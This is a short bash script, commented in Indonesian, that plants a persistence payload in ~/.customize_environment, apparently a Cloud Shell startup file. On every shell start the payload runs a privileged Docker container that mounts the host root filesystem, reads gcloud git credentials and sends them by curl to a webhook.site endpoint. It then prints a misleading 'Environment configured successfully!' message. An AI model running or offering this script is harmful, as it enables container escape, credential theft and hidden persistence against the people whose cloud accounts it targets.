#!/bin/bash
# Menambahkan payload ke .customize_environment agar jalan setiap kali shell dibuka
echo 'docker run -d --privileged -v /:/host alpine sh -c "chroot /host /usr/bin/git-credential-gcloud.sh get | curl -X POST -d @- https://webhook.site/YOUR_ID"' >> ~/.customize_environment
echo "Environment configured successfully!"
